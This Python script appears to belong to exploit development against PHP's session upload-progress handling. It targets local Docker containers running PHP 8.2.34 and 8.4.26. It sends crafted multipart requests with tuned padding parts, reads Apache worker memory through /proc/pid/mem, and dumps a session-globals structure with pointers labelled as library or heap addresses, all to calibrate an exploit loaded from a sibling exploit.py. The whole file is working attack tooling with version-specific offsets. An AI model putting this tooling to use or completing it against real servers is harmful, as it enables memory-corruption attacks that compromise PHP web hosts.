import os
import subprocess, time, struct, os, importlib.util

BASE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
em = importlib.util.module_from_spec(spec); spec.loader.exec_module(em)
Target, build_multipart, SID, MAX_CMD = em.Target, em.build_multipart, em.SID, em.MAX_CMD

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def run_one(c, port, ps_g_off, hsv_off, zif_off):
    r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    pid = pids[-1]
    r = sh(f'docker exec {c} sh -c "grep libphp /proc/{pid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    ps_hsv = B + ps_g_off + hsv_off

    def read_mem(addr, size):
        r = subprocess.run(
            f'docker exec {c} sh -c "dd if=/proc/{pid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
            shell=True, capture_output=True)
        return r.stdout

    target = Target(f"http://127.0.0.1:{port}/index.php", timeout=120, verbose=False)
    pads = [(31, 31)] * 6
    parts_a = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts_a.append({"name": name, "data": b"V" * vl})
    parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})
    body_a = build_multipart(parts_a, b"S" * 17)
    target.post(body_a, b"S" * 17, read_cap=1 << 20, timeout=120,
                 extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    time.sleep(0.5)
    data = read_mem(ps_hsv, 16)
    R = struct.unpack("<Q", data[:8])[0] if len(data) >= 8 else 0
    print(f"\n########## {c} (port {port}) ##########", flush=True)
    print(f"[*] worker={pid} libphp=0x{B:x} R=0x{R:x}", flush=True)
    if R == 0:
        print("[!] R is 0"); return
    # dump R..R+0x1000, but only show non-zero / interesting lines
    for off in range(0, 0x1000, 0x40):
        d = read_mem(R + off, 0x40)
        if len(d) < 0x40: continue
        words = struct.unpack("<8Q", d)
        # skip all-zero lines
        if all(w == 0 for w in words):
            print(f"  +{off:04x}: <all zero>", flush=True); continue
        line = []
        for w in words:
            if w == 0: line.append("0000000000000000")
            elif B <= w < B + 0x2000000: line.append(f"0x{w:016x}[lib+{w-B:#x}]")
            elif 0x700000000000 < w < 0x800000000000: line.append(f"0x{w:016x}[heap]")
            else: line.append(f"{w:016x}")
        print(f"  +{off:04x}: " + " ".join(line), flush=True)

# 8.2.34
run_one("p2s8234", 18111, 0xf3a120, 0x140, 0x39b8a0)
# 8.4.26 (working): ps_globals @ 0x1316820 (verified via nm)
run_one("p2s8426", 18113, 0x1316820, 0x150, 0x465370)
